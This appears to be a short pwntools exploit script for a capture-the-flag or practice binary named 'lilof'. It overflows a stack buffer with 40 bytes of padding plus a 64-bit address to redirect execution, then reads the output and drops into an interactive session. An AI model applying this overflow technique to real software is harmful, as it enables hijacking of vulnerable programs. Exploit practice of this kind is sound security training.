from pwn import *

p = process('./lilof')

payload = b'A' * 40 + p64(0x5ab1bb0)

p.sendline(payload)

response=p.recvline(False).decode()

print(response)

p.interactive()


#p.close()
